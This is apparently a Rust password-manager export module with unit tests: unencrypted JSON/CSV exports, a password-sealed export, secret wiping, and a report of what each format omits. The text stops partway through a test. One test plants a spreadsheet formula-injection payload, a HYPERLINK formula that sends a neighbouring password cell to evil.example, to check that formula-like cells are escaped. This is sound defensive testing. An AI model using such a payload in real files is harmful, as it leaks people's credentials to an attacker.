//! Exports: unencrypted ones for moving to another password manager, and the same JSON sealed
//! under a password of its own (`.vaultx`).
//!
//! Both plain ones use the common layout most managers import: JSON (`.json`, keeps folders,
//! custom fields and cards) and CSV (`.csv`, logins and notes). The output is plain text holding
//! every password: it is returned in a wiped-on-drop buffer and should go straight to a file the
//! user chose.
//!
//! The sealed export carries every item whole, attached files and passkeys included; the plain
//! ones leave those out. No export is the whole vault (folders keep only their names, the item
//! lock stays behind): [`export_report`] counts, before the file is made, what a format leaves
//! out and what it writes in clear, for the app to show the person first.

use base64::Engine as _;
use base64::engine::general_purpose::{STANDARD, URL_SAFE_NO_PAD};
use serde_json::{Value, json};
use vault_core::{Attachment, ItemData, ItemId, ItemKind, Passkey, RecoveryCode, Vault};
use zeroize::{Zeroize, Zeroizing};

/// One item with its secrets.
///
/// A locked item (its secrets sealed under the item guard) reads without its secrets, so an
/// export of it would quietly hold none: the export fails instead, and the app opens the
/// secrets first.
fn open_item(vault: &Vault, id: &ItemId) -> Result<ItemData, vault_core::Error> {
    let item = vault.get_item(id)?;
    if item.is_locked() {
        return Err(vault_core::Error::SecretsLocked);
    }
    Ok(item)
}

/// Every item with its folder name, in the file's order.
fn items(vault: &Vault) -> Result<Vec<(ItemData, Option<String>)>, vault_core::Error> {
    let mut out = Vec::with_capacity(vault.len());
    for id in vault.item_ids() {
        let item = open_item(vault, &id)?;
        let folder = item.folder.and_then(|folder| {
            vault
                .folders()
                .iter()
                .find(|f| f.id == folder)
                .map(|f| f.name.clone())
        });
        out.push((item, folder));
    }
    out.sort_by_key(|a| a.0.title.to_lowercase());
    Ok(out)
}

/// The hidden custom field an item's recovery codes travel in: other managers have no place
/// for them.
pub(crate) const RECOVERY_CODES_FIELD: &str = "Recovery codes";

/// What a spent recovery code is followed by in that field.
pub(crate) const USED_MARK: &str = " (used)";

/// Recovery codes as the text of [`RECOVERY_CODES_FIELD`], one per line, spent ones marked.
pub(crate) fn codes_text(codes: &[RecoveryCode]) -> Option<Zeroizing<String>> {
    (!codes.is_empty()).then(|| {
        Zeroizing::new(
            codes
                .iter()
                .map(|c| {
                    if c.used {
                        format!("{}{USED_MARK}", c.code)
                    } else {
                        c.code.clone()
                    }
                })
                .collect::<Vec<_>>()
                .join("\n"),
        )
    })
}

/// The JSON keys only this app reads: what the item had that the file leaves out, so that an
/// import of the file can say so by name (`leftOut`), and the recovery codes as codes
/// (`recoveryCodes`, next to the hidden field other managers read). Other managers skip keys
/// they don't know.
///
/// The sealed export also carries what makes it whole: the attached files (`attachedFiles`),
/// the passkeys with their private keys (`passkeys`, at the item's level, apart from the
/// `login.fido2Credentials` other managers write) and whether the item is a passkey item
/// (`passkeyItem`; other managers read it as the login it is written as). The plain exports
/// never write them: the files would make them huge, and a passkey's key in clear would let
/// whoever reads the file sign in as you.
fn own_keys(entry: &mut Value, item: &ItemData, sealed: bool) {
    if sealed {
        if !item.attachments.is_empty() {
            entry["attachedFiles"] = item.attachments.iter().map(attached_file).collect();
        }
        if !item.passkeys.is_empty() {
            entry["passkeys"] = item.passkeys.iter().map(passkey).collect();
        }
        if item.kind == ItemKind::Passkey {
            entry["passkeyItem"] = Value::Bool(true);
        }
    } else {
        let mut left_out = serde_json::Map::new();
        let mut count = |key: &str, n: usize| {
            if n > 0 {
                left_out.insert(key.into(), n.into());
            }
        };
        count("attachments", item.attachments.len());
        count("passkeys", item.passkeys.len());
        count("passwordHistory", item.password_history.len());
        if !left_out.is_empty() {
            entry["leftOut"] = Value::Object(left_out);
        }
    }
    if !item.recovery_codes.is_empty() {
        entry["recoveryCodes"] = item
            .recovery_codes
            .iter()
            .map(|c| json!({ "code": c.code, "used": c.used }))
            .collect();
    }
}

/// An attached file in the sealed export: its name, when it was added and its bytes in
/// base64. Each text is made at its exact size and moved in (`json!` would copy it), so the
/// document's wipe reaches every copy.
fn attached_file(file: &Attachment) -> Value {
    let mut entry = serde_json::Map::new();
    entry.insert("name".into(), Value::String(file.name.clone()));
    entry.insert("addedDate".into(), Value::String(iso8601(file.added_at)));
    entry.insert("data".into(), Value::String(STANDARD.encode(&file.data)));
    Value::Object(entry)
}

/// A passkey in the sealed export, its private key included (the 32-byte P-256 scalar);
/// binary values in unpadded base64url, as WebAuthn writes them.
fn passkey(passkey: &Passkey) -> Value {
    let binary = |bytes: &[u8]| Value::String(URL_SAFE_NO_PAD.encode(bytes));
    let mut entry = serde_json::Map::new();
    entry.insert("credentialId".into(), binary(&passkey.credential_id));
    entry.insert("rpId".into(), Value::String(passkey.rp_id.clone()));
    entry.insert("userHandle".into(), binary(&passkey.user_handle));
    entry.insert("userName".into(), Value::String(passkey.user_name.clone()));
    entry.insert(
        "displayName".into(),
        Value::String(passkey.display_name.clone()),
    );
    entry.insert(
        "creationDate".into(),
        Value::String(iso8601(passkey.created_at)),
    );
    entry.insert("key".into(), binary(passkey.private_key()));
    Value::Object(entry)
}

/// The `login` block of an item that isn't a login: what its kind's own block has no place
/// for (a card's website, an SSH key's user, the password of a note that came from another
/// manager). This app's importer reads it on any item; other managers read it on logins only.
fn other_login(item: &ItemData) -> Option<Value> {
    // The card's holder and PIN and the SSH private key are in their own blocks.
    let username = match item.kind {
        ItemKind::Card => "",
        _ => item.username.as_str(),
    };
    let password = match item.kind {
        ItemKind::SecureNote => item.password.as_str(),
        _ => "",
    };
    if username.is_empty() && password.is_empty() && item.urls.is_empty() && item.totp.is_empty() {
        return None;
    }
    Some(login_block(item, username, password))
}

fn login_block(item: &ItemData, username: &str, password: &str) -> Value {
    json!({
        "uris": item.urls.iter().map(|u| json!({ "match": null, "uri": u })).collect::<Vec<_>>(),
        "username": username,
        "password": password,
        "totp": (!item.totp.is_empty()).then_some(&item.totp),
        "passwordRevisionDate": (item.password_changed_at != 0)
            .then(|| iso8601(item.password_changed_at)),
    })
}

fn iso8601(unix: i64) -> String {
    let days = unix.div_euclid(86_400);
    let secs = unix.rem_euclid(86_400);
    // Days → civil date (Howard Hinnant).
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let day = doy - (153 * mp + 2) / 5 + 1;
    let month = if mp < 10 { mp + 3 } else { mp - 9 };
    let year = yoe + era * 400 + i64::from(month <= 2);
    format!(
        "{year:04}-{month:02}-{day:02}T{:02}:{:02}:{:02}.000Z",
        secs / 3600,
        secs % 3600 / 60,
        secs % 60
    )
}

/// The JSON export sealed under a password of its own (`vault_core::sealed_export`): for a
/// copy to carry elsewhere that is not readable by whoever finds the file. Unlike the plain
/// JSON it keeps every item whole: earlier passwords, attached files and passkeys (with their
/// private keys, [`own_keys`]). Nobody reads them without the file's password.
/// A password below the one-factor floor is refused before anything is read
/// ([`vault_core::Error::WeakPassword`], `sealed_export::password_holds`).
pub fn export_sealed(vault: &Vault, password: &str) -> Result<Vec<u8>, vault_core::Error> {
    if !vault_core::sealed_export::password_holds(password) {
        return Err(vault_core::Error::WeakPassword);
    }
    let json = document(vault, true)?;
    vault_core::sealed_export::seal(password, json.as_bytes())
}

/// Unencrypted JSON in the common layout (keeps folders, cards and fields).
pub fn export_json(vault: &Vault) -> Result<Zeroizing<String>, vault_core::Error> {
    document(vault, false)
}

/// The JSON of both: `sealed` adds the earlier passwords, attached files and passkeys.
fn document(vault: &Vault, sealed: bool) -> Result<Zeroizing<String>, vault_core::Error> {
    let folders: Vec<Value> = vault
        .folders()
        .iter()
        .map(|f| json!({ "id": f.id.to_hex(), "name": f.name }))
        .collect();
    let mut items_json = Vec::new();
    for (index, (item, _)) in items(vault)?.iter().enumerate() {
        // An SSH key's public half and fingerprint go in its own block, not as fields: the
        // first of each name (another one, such as a host's fingerprint, is a field).
        let ssh_field = |name: &str| {
            (item.kind == ItemKind::SshKey)
                .then(|| item.custom_fields.iter().position(|f| f.name == name))
                .flatten()
        };
        let public = ssh_field(vault_core::ssh::PUBLIC_KEY_FIELD);
        let fingerprint = ssh_field(vault_core::ssh::FINGERPRINT_FIELD);
        let mut fields: Vec<Value> = item
            .custom_fields
            .iter()
            .enumerate()
            .filter(|(at, _)| Some(*at) != public && Some(*at) != fingerprint)
            .map(
                |(_, f)| json!({ "name": f.name, "value": f.value, "type": u8::from(f.sensitive) }),
            )
            .collect();
        if let Some(codes) = codes_text(&item.recovery_codes) {
            fields
                .push(json!({ "name": RECOVERY_CODES_FIELD, "value": codes.as_str(), "type": 1 }));
        }
        let mut entry = json!({
            "id": format!("item-{index}"),
            "folderId": item.folder.map(|f| f.to_hex()),
            "type": match item.kind {
                ItemKind::Login | ItemKind::Passkey => 1,
                ItemKind::SecureNote => 2,
                ItemKind::Card => 3,
                ItemKind::SshKey => 5,
            },
            "reprompt": u8::from(item.reprompt),
            "name": item.title,
            "notes": (!item.notes.is_empty()).then_some(&item.notes),
            "favorite": item.favorite,
            "fields": null,
            "creationDate": iso8601(item.created_at),
            "revisionDate": iso8601(item.updated_at),
        });
        // Moved in, not copied (`json!` copies what it is given).
        entry["fields"] = Value::Array(fields);
        own_keys(&mut entry, item, sealed);
        if sealed && !item.password_history.is_empty() {
            entry["passwordHistory"] = item
                .password_history
                .iter()
                .map(|old| json!({ "lastUsedDate": iso8601(old.replaced_at), "password": old.password }))
                .collect();
        }
        match item.kind {
            ItemKind::Login | ItemKind::Passkey => {
                entry["login"] = login_block(item, &item.username, &item.password);
            }
            ItemKind::SecureNote => entry["secureNote"] = json!({ "type": 0 }),
            // Its details are fields; the code is its PIN (`json.rs` reads it back as one).
            ItemKind::Card => {
                entry["card"] = json!({
                    "cardholderName": item.username,
                    "code": (!item.password.is_empty()).then_some(&item.password),
                });
            }
            ItemKind::SshKey => {
                let value = |at: Option<usize>| at.map(|at| &item.custom_fields[at].value);
                entry["sshKey"] = json!({
                    "privateKey": item.password,
                    "publicKey": value(public),
                    "keyFingerprint": value(fingerprint),
                });
            }
        }
        if !matches!(item.kind, ItemKind::Login | ItemKind::Passkey)
            && let Some(login) = other_login(item)
        {
            entry["login"] = login;
        }
        items_json.push(entry);
    }
    let mut document = json!({ "encrypted": false, "folders": folders, "items": null });
    document["items"] = Value::Array(items_json);
    let text = to_text(&document);
    wipe(&mut document);
    text
}

/// The document as text in a buffer of its exact size: one that grew would leave copies of
/// the passwords behind in the memory it outgrew.
fn to_text(document: &Value) -> Result<Zeroizing<String>, vault_core::Error> {
    struct Count(usize);
    impl std::io::Write for Count {
        fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
            self.0 += bytes.len();
            Ok(bytes.len())
        }
        fn flush(&mut self) -> std::io::Result<()> {
            Ok(())
        }
    }
    let malformed = |_| vault_core::Error::Malformed;
    let mut size = Count(0);
    serde_json::to_writer_pretty(&mut size, document).map_err(malformed)?;
    let mut text = Zeroizing::new(Vec::with_capacity(size.0));
    serde_json::to_writer_pretty(&mut *text, document).map_err(malformed)?;
    String::from_utf8(std::mem::take(&mut *text))
        .map(Zeroizing::new)
        .map_err(|err| {
            err.into_bytes().zeroize();
            vault_core::Error::Malformed
        })
}

/// Wipes every text of the document: copies of the items it was made from.
fn wipe(value: &mut Value) {
    match value {
        Value::String(text) => text.zeroize(),
        Value::Array(values) => values.iter_mut().for_each(wipe),
        Value::Object(map) => map.values_mut().for_each(wipe),
        Value::Null | Value::Bool(_) | Value::Number(_) => {}
    }
}

/// What a spreadsheet reads as the start of a formula.
const FORMULA_STARTS: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];

/// A CSV cell that a spreadsheet would run as a formula gets a leading `'`, which shows it
/// as plain text: a title such as `=HYPERLINK(…)` that came from someone else's file must not
/// send the passwords next to it anywhere when the export is opened. [`from_text`] takes the
/// mark off again on import; text that already looks like a marked cell gets one more, so that
/// it comes back as it was.
pub(crate) fn as_text(cell: String) -> String {
    if cell.trim_start_matches('\'').starts_with(FORMULA_STARTS) {
        format!("'{cell}")
    } else {
        cell
    }
}

/// The cell as it was before [`as_text`].
pub(crate) fn from_text(cell: String) -> String {
    match cell.strip_prefix('\'') {
        Some(rest) if rest.trim_start_matches('\'').starts_with(FORMULA_STARTS) => rest.to_owned(),
        _ => cell,
    }
}

/// CSV in the common layout (logins and notes; cards go out as notes with their fields).
///
/// Text cells are marked so spreadsheets don't run them as formulas ([`as_text`]). The
/// password and the one-time code secret are written exactly as they are: other managers
/// read this file too, and a changed password would no longer sign in.
pub fn export_csv(vault: &Vault) -> Result<Zeroizing<String>, vault_core::Error> {
    let mut writer = csv::Writer::from_writer(Vec::new());
    let header = [
        "folder",
        "favorite",
        "type",
        "name",
        "notes",
        "fields",
        "reprompt",
        "login_uri",
        "login_username",
        "login_password",
        "login_totp",
    ];
    let to_error = |_| vault_core::Error::Malformed;
    writer.write_record(header).map_err(to_error)?;
    for (item, folder) in items(vault)? {
        let mut fields: Zeroizing<Vec<String>> = Zeroizing::new(
            item.custom_fields
                .iter()
                .map(|f| format!("{}: {}", f.name, f.value))
                .collect(),
        );
        if let Some(codes) = codes_text(&item.recovery_codes) {
            let line = Zeroizing::new(codes.replace('\n', " "));
            fields.push(format!("{RECOVERY_CODES_FIELD}: {}", *line));
        }
        let is_login = matches!(item.kind, ItemKind::Login | ItemKind::Passkey);
        let mut record = Zeroizing::new(vec![
            as_text(folder.unwrap_or_default()),
            if item.favorite { "1" } else { "" }.to_owned(),
            if is_login { "login" } else { "note" }.to_owned(),
            as_text(item.title.clone()),
            as_text(item.notes.clone()),
            as_text(fields.join("\n")),
            if item.reprompt { "1" } else { "" }.to_owned(),
            as_text(item.urls.first().cloned().unwrap_or_default()),
            as_text(item.username.clone()),
            item.password.clone(),
            item.totp.clone(),
        ]);
        writer.write_record(record.iter()).map_err(to_error)?;
        zeroize::Zeroize::zeroize(&mut *record);
    }
    let bytes = writer
        .into_inner()
        .map_err(|_| vault_core::Error::Malformed)?;
    String::from_utf8(bytes)
        .map(Zeroizing::new)
        .map_err(|_| vault_core::Error::Malformed)
}

/// The formats a vault is exported in.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ExportFormat {
    /// JSON sealed under a password chosen for the file (`.vaultx`, [`export_sealed`]).
    Sealed,
    /// Unencrypted JSON ([`export_json`]).
    Json,
    /// Unencrypted CSV ([`export_csv`]).
    Csv,
}

/// What an export of a vault leaves out and what it writes readable by anyone who has the
/// file, counted before the file is made ([`export_report`]). The app shows it while the
/// person chooses, so nobody keeps an export believing it is the whole vault, or a plain one
/// believing it is safe to leave lying around. Counts only: nothing secret.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct ExportReport {
    /// Items in the file.
    pub items: usize,
    /// What the vault has and the file doesn't (or not in the same form).
    pub left_out: LeftOut,
    /// Secrets the file holds as plain text: none for the sealed export.
    pub in_clear: InClear,
    /// Titles of the items that lose something counted in `left_out`, in the file's order.
    pub affected: Vec<String>,
}

/// What an export leaves out, across the vault.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct LeftOut {
    /// Files attached to items: only the sealed export carries them.
    pub attachments: usize,
    /// Passkeys: only the sealed export carries them (their private keys never go out in
    /// clear).
    pub passkeys: usize,
    /// Earlier passwords: only the sealed export carries them.
    pub earlier_passwords: usize,
    /// Websites after an item's first: CSV has one per item.
    pub extra_websites: usize,
    /// Hidden fields written as plain "name: value" lines in CSV, which has no hidden mark:
    /// other managers show them, and this app hides them again only when their names look
    /// secret.
    pub hidden_marks: usize,
    /// Items whose recovery codes go out in CSV as one line of text: they come back as a
    /// hidden field, no longer codes that can be marked used.
    pub recovery_code_lists: usize,
    /// Items that come back as another kind, their contents kept: passkey items as logins
    /// (the plain formats), cards and SSH keys as notes (CSV).
    pub kinds_changed: usize,
    /// CSV has no dates: when each item was made and changed, and its password set.
    pub dates: bool,
}

impl LeftOut {
    /// The export keeps everything (as far as these counts go).
    pub fn is_empty(&self) -> bool {
        *self == Self::default()
    }
}

/// Secrets an unencrypted export writes as plain text, across the vault.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct InClear {
    /// Passwords (an SSH key's private key and a card's PIN among them).
    pub passwords: usize,
    /// One-time code secrets.
    pub otp_secrets: usize,
    /// Values of hidden fields (a card's number and security code among them).
    pub hidden_fields: usize,
    /// Recovery codes.
    pub recovery_codes: usize,
    /// Items with notes.
    pub notes: usize,
    /// CSV: passwords and one-time code secrets that start the way a spreadsheet formula
    /// does (`=`, `+`, `-`, `@`). They are written exactly as they are, since another manager
    /// must read them unchanged, so the file must not be opened in a spreadsheet.
    pub formula_like: usize,
}

impl InClear {
    /// Nothing secret is readable without a password.
    pub fn is_empty(&self) -> bool {
        *self == Self::default()
    }
}

/// What exporting `vault` as `format` would leave out and write in clear. Fails like the
/// export itself: with [`vault_core::Error::SecretsLocked`] while an item's secrets are locked.
pub fn export_report(
    vault: &Vault,
    format: ExportFormat,
) -> Result<ExportReport, vault_core::Error> {
    let csv = format == ExportFormat::Csv;
    let mut report = ExportReport::default();
    // One item decrypted at a time: counting keeps none of them in memory.
    for id in vault.item_ids() {
        let item = open_item(vault, &id)?;
        report.items += 1;
        // A hidden field with nothing in it has nothing to lose or to show.
        let hidden = item
            .custom_fields
            .iter()
            .filter(|f| f.sensitive && !f.value.is_empty())
            .count();
        // The sealed export keeps the item whole; the plain ones leave these out.
        let sealed = format == ExportFormat::Sealed;
        let (files, passkeys, earlier) = if sealed {
            (0, 0, 0)
        } else {
            (
                item.attachments.len(),
                item.passkeys.len(),
                item.password_history.len(),
            )
        };
        let kind_changes = match item.kind {
            ItemKind::Passkey => !sealed,
            ItemKind::Card | ItemKind::SshKey => csv,
            ItemKind::Login | ItemKind::SecureNote => false,
        };
        let out = &mut report.left_out;
        out.attachments += files;
        out.passkeys += passkeys;
        out.earlier_passwords += earlier;
        out.kinds_changed += usize::from(kind_changes);
        let mut loses = files > 0 || passkeys > 0 || earlier > 0 || kind_changes;
        if csv {
            out.extra_websites += item.urls.len().saturating_sub(1);
            out.hidden_marks += hidden;
            out.recovery_code_lists += usize::from(!item.recovery_codes.is_empty());
            // Every item loses its dates: counted once, not as a loss of each.
            out.dates = true;
            loses |= item.urls.len() > 1 || hidden > 0 || !item.recovery_codes.is_empty();
        }
        if loses {
            report.affected.push(item.title.clone());
        }
        if sealed {
            continue;
        }
        let clear = &mut report.in_clear;
        clear.passwords += usize::from(!item.password.is_empty());
        clear.otp_secrets += usize::from(!item.totp.trim().is_empty());
        clear.hidden_fields += hidden;
        clear.recovery_codes += item.recovery_codes.len();
        clear.notes += usize::from(!item.notes.is_empty());
        if csv {
            clear.formula_like += [&item.password, &item.totp]
                .iter()
                .filter(|cell| cell.starts_with(FORMULA_STARTS))
                .count();
        }
    }
    report.affected.sort_by_key(|title| title.to_lowercase());
    Ok(report)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{import_csv, import_json};
    use vault_core::{Attachment, CustomField, GuardCheck, KdfParams, Passkey, SecretKey};

    fn vault() -> Vault {
        let mut vault = Vault::create(
            "export test passphrase",
            &SecretKey::generate().unwrap(),
            None,
            KdfParams::minimum().unwrap(),
        )
        .unwrap();
        let google = vault.add_folder("Google").unwrap();
        let mut gmail = ItemData::login(
            "Gmail",
            "me@example.com",
            "pa,ss\"word",
            "https://mail.google.com",
        );
        gmail.folder = Some(google);
        gmail.totp = "JBSWY3DPEHPK3PXP".into();
        gmail.favorite = true;
        gmail.recovery_codes = RecoveryCode::parse_list("aaaa\nbbbb");
        gmail.recovery_codes[0].used = true;
        gmail.custom_fields.push(CustomField {
            name: "PIN".into(),
            value: "1234".into(),
            sensitive: true,
        });
        vault.add_item(&gmail).unwrap();
        let mut note = ItemData::new(ItemKind::SecureNote, "Alarm");
        note.notes = "code 1234\nthen #".into();
        vault.add_item(&note).unwrap();
        vault
    }

    #[test]
    fn json_round_trips_through_our_importer() {
        let vault = vault();
        let json = export_json(&vault).unwrap();
        let report = import_json(json.as_bytes()).unwrap();
        assert_eq!(report.items.len(), 2);
        let gmail = report
            .items
            .iter()
            .position(|i| i.title == "Gmail")
            .unwrap();
        let item = &report.items[gmail];
        assert_eq!(item.password, "pa,ss\"word");
        assert_eq!(item.urls, ["https://mail.google.com"]);
        assert_eq!(item.totp, "JBSWY3DPEHPK3PXP");
        assert!(item.favorite);
        assert_eq!(report.folders[gmail].as_deref(), Some("Google"));
        // The recovery codes come back as codes, the spent one still marked.
        let codes: Vec<(&str, bool)> = item
            .recovery_codes
            .iter()
            .map(|c| (c.code.as_str(), c.used))
            .collect();
        assert_eq!(codes, [("aaaa", true), ("bbbb", false)]);
        assert!(
            !item
                .custom_fields
                .iter()
                .any(|f| f.name == RECOVERY_CODES_FIELD)
        );
        let note = report.items.iter().find(|i| i.title == "Alarm").unwrap();
        assert_eq!(note.kind, ItemKind::SecureNote);
        assert_eq!(note.notes, "code 1234\nthen #");
    }

    #[test]
    fn csv_round_trips_through_our_importer() {
        let vault = vault();
        let csv = export_csv(&vault).unwrap();
        assert!(csv.starts_with("folder,favorite,type,name"));
        let report = import_csv(csv.as_bytes()).unwrap();
        assert_eq!(report.items.len(), 2);
        let gmail = report
            .items
            .iter()
            .position(|i| i.title == "Gmail")
            .unwrap();
        assert_eq!(report.items[gmail].password, "pa,ss\"word");
        assert_eq!(report.folders[gmail].as_deref(), Some("Google"));
        assert!(report.items[gmail].favorite);
    }

    #[test]
    fn csv_cells_that_look_like_formulas_are_marked_as_text() {
        let mut vault = vault();
        let mut planted = ItemData::login(
            "=HYPERLINK(\"https://evil.example/?\"&J2,\"x\")",
            "+1 555 0100",
            "-starts-with-a-dash",
            "https://example.com",
        );
        planted.notes = "@SUM(1)".into();
        vault.add_item(&planted).unwrap();

        let csv = export_csv(&vault).unwrap();
        assert!(csv.contains("'=HYPERLINK"), "{}", csv.as_str());
        assert!(csv.contains("'+1 555 0100"));
        assert!(csv.contains("'@SUM(1)"));
        // The password goes out exactly as it is.
        assert!(csv.contains(",-starts-with-a-dash,"));
        assert!(!csv.contains("'-starts-with-a-dash"));

        // Our importer takes the mark off again.
        let report = import_csv(csv.as_bytes()).unwrap();
        let item = report
            .items
            .iter()
            .find(|i| i.username == "+1 555 0100")
            .unwrap();
        assert_eq!(item.title, planted.title);
        assert_eq!(item.notes, "@SUM(1)");
        assert_eq!(item.password, "-starts-with-a-dash");
        // A plain apostrophe at the start is kept.
        assert_eq!(from_text("'quoted".into()), "'quoted");
        assert_eq!(as_text("plain".into()), "plain");
    }

    #[test]
    fn dates() {
        assert_eq!(iso8601(0), "1970-01-01T00:00:00.000Z");
        assert_eq!(iso8601(1_700_000_000), "2023-11-14T22:13:20.000Z");
    }

    /// [`vault`] with something of everything an item holds: a login with two websites, a
    /// hidden field, an attached file, a passkey and an earlier password; a passkey item, a
    /// card and an SSH key.
    fn full_vault() -> Vault {
        let mut vault = vault();
        let mut mail = ItemData::login("Mail", "me", "first password", "https://mail.example");
        mail.urls.push("https://webmail.example".into());
        mail.custom_fields.push(CustomField {
            name: "Answer".into(),
            value: "blue".into(),
            sensitive: true,
        });
        mail.attachments
            .push(Attachment::new("scan.txt", b"test attachment".to_vec()).unwrap());
        mail.passkeys
            .push(Passkey::new("mail.example", b"user-1", "me", "Me").unwrap());
        let id = vault.add_item(&mail).unwrap();
        // A new password: the first one goes into the history.
        let mut changed = vault.get_item(&id).unwrap();
        changed.password = "=second password".into();
        vault.update_item(&id, &changed).unwrap();
        let mut shop = ItemData::new(ItemKind::Passkey, "Shop");
        shop.passkeys
            .push(Passkey::new("shop.example", b"user-2", "me", "Me").unwrap());
        vault.add_item(&shop).unwrap();
        let mut card = ItemData::new(ItemKind::Card, "Visa");
        card.custom_fields.push(CustomField {
            name: vault_core::card::NUMBER.into(),
            value: "4111111111111111".into(),
            sensitive: true,
        });
        vault.add_item(&card).unwrap();
        let mut ssh = ItemData::new(ItemKind::SshKey, "Server");
        ssh.password = "test private key".into();
        vault.add_item(&ssh).unwrap();
        vault
    }

    fn titled(vault: &Vault, title: &str) -> ItemData {
        vault
            .item_ids()
            .map(|id| vault.get_item(&id).unwrap())
            .find(|item| item.title == title)
            .unwrap()
    }

    #[test]
    fn an_item_with_locked_secrets_is_never_exported_without_them() {
        let mut vault = vault();
        vault
            .set_item_guard(
                true,
                GuardCheck::Pin,
                Some("2468"),
                Some("export test passphrase"),
            )
            .unwrap();
        vault.lock_secrets();
        assert!(vault.summaries().unwrap().iter().all(|s| s.locked));
        let refused = |result: Result<(), vault_core::Error>| {
            matches!(result, Err(vault_core::Error::SecretsLocked))
        };
        assert!(refused(export_json(&vault).map(drop)));
        assert!(refused(export_csv(&vault).map(drop)));
        assert!(refused(
            export_sealed(&vault, "a long password for the file").map(drop)
        ));
        // A password below the one-factor floor is refused before anything is read.
        assert!(matches!(
            export_sealed(&vault, "a file password"),
            Err(vault_core::Error::WeakPassword)
        ));
        assert!(refused(export_report(&vault, ExportFormat::Json).map(drop)));
        // Once the secrets are open, the export holds them.
        assert!(vault.unlock_secrets("2468").unwrap());
        assert!(export_json(&vault).unwrap().contains("pa,ss\\\"word"));
    }

    #[test]
    fn the_report_counts_what_each_format_leaves_out_and_writes_in_clear() {
        let vault = full_vault();
        let report = |format| export_report(&vault, format).unwrap();

        let sealed = report(ExportFormat::Sealed);
        assert_eq!(sealed.items, 6);
        assert!(sealed.left_out.is_empty(), "{:?}", sealed.left_out);
        assert!(sealed.in_clear.is_empty(), "sealed under its password");
        assert!(sealed.affected.is_empty());

        let json = report(ExportFormat::Json);
        assert_eq!(
            json.left_out,
            LeftOut {
                attachments: 1,
                passkeys: 2,
                earlier_passwords: 1,
                kinds_changed: 1,
                ..LeftOut::default()
            }
        );
        let in_clear = InClear {
            passwords: 3,
            otp_secrets: 1,
            hidden_fields: 3,
            recovery_codes: 2,
            notes: 1,
            formula_like: 0,
        };
        assert_eq!(json.in_clear, in_clear);
        assert_eq!(json.affected, ["Mail", "Shop"]);

        let csv = report(ExportFormat::Csv);
        assert_eq!(
            csv.left_out,
            LeftOut {
                attachments: 1,
                passkeys: 2,
                earlier_passwords: 1,
                extra_websites: 1,
                hidden_marks: 3,
                recovery_code_lists: 1,
                kinds_changed: 3,
                dates: true,
            }
        );
        // "=second password" goes out as it is: the file is no spreadsheet's to open.
        assert_eq!(
            csv.in_clear,
            InClear {
                formula_like: 1,
                ..in_clear
            }
        );
        assert_eq!(csv.affected, ["Gmail", "Mail", "Server", "Shop", "Visa"]);
    }

    #[test]
    fn the_protected_export_brings_back_every_item_whole() {
        let vault = full_vault();
        let sealed = export_sealed(&vault, "a long password for the file").unwrap();
        let report = crate::import(
            &sealed,
            crate::Format::Sealed,
            "a long password for the file",
            None,
        )
        .unwrap();
        let back = |title: &str| report.items.iter().find(|i| i.title == title).unwrap();

        let (gmail, original) = (back("Gmail"), titled(&vault, "Gmail"));
        assert_eq!(gmail.recovery_codes, original.recovery_codes);
        assert!(gmail.recovery_codes[0].used && !gmail.recovery_codes[1].used);
        // Codes again, not a hidden field next to them.
        assert_eq!(gmail.custom_fields, original.custom_fields);

        let (mail, original) = (back("Mail"), titled(&vault, "Mail"));
        assert_eq!(mail.password, "=second password");
        assert_eq!(mail.password_history.len(), 1);
        assert_eq!(mail.password_history, original.password_history);
        assert_eq!(mail.password_changed_at, original.password_changed_at);
        // The attached file, byte for byte, with when it was added.
        assert_eq!(mail.attachments, original.attachments);
        // The passkey with its private key: it signs as the one in the vault does, so the
        // site still accepts it.
        assert_eq!(mail.passkeys.len(), 1);
        let (copy, kept) = (&mail.passkeys[0], &original.passkeys[0]);
        assert_eq!(copy.credential_id, kept.credential_id);
        assert_eq!(copy.rp_id, kept.rp_id);
        assert_eq!(copy.user_handle, kept.user_handle);
        assert_eq!(
            (&copy.user_name, &copy.display_name, copy.created_at),
            (&kept.user_name, &kept.display_name, kept.created_at)
        );
        assert_eq!(copy.public_key().unwrap(), kept.public_key().unwrap());
        let data = copy.authenticator_data(false, true).unwrap();
        let signature = copy.sign(&data, &[7; 32]).unwrap();
        let mut message = data.clone();
        message.extend_from_slice(&[7; 32]);
        assert!(vault_core::passkey::verify(
            &kept.public_key().unwrap(),
            &message,
            &signature
        ));
        // A passkey item comes back as one.
        let (shop, original) = (back("Shop"), titled(&vault, "Shop"));
        assert_eq!(shop.kind, ItemKind::Passkey);
        assert_eq!(shop.passkeys.len(), 1);
        assert_eq!(
            shop.passkeys[0].private_key(),
            original.passkeys[0].private_key()
        );
        // Nothing left behind to warn about.
        assert!(report.warnings.is_empty(), "{:?}", report.warnings);
    }

    #[test]
    fn only_the_sealed_export_holds_files_and_passkeys() {
        let vault = full_vault();
        let plain = export_json(&vault).unwrap();
        let key = URL_SAFE_NO_PAD.encode(titled(&vault, "Mail").passkeys[0].private_key());
        assert!(!plain.contains(&key), "a passkey's key in clear");
        assert!(!plain.contains("attachedFiles") && !plain.contains("passkeyItem"));
        // Read back, the plain file names what it left out, as before.
        let report = import_json(plain.as_bytes()).unwrap();
        assert!(
            report.warnings.iter().any(|w| w.starts_with(
                "\"Mail\": 1 attached file, 1 passkey and 1 earlier password were not in this export"
            )),
            "{:?}",
            report.warnings
        );
    }

    /// What an item holds, its extra fields in any order.
    fn contents(item: &ItemData) -> ItemData {
        let mut item = item.clone();
        item.custom_fields.sort_by(|a, b| a.name.cmp(&b.name));
        item.folder = None;
        item
    }

    #[test]
    fn every_kind_comes_back_whole_from_the_json_and_the_protected_export() {
        let mut vault = vault();
        let mut card = ItemData::new(ItemKind::Card, "Test card");
        card.username = "A HOLDER".into();
        card.password = "4821".into();
        card.urls = vec!["https://bank.example".into()];
        vault_core::card::CardDetails {
            number: "4111111111111111".into(),
            expiry: "08/29".into(),
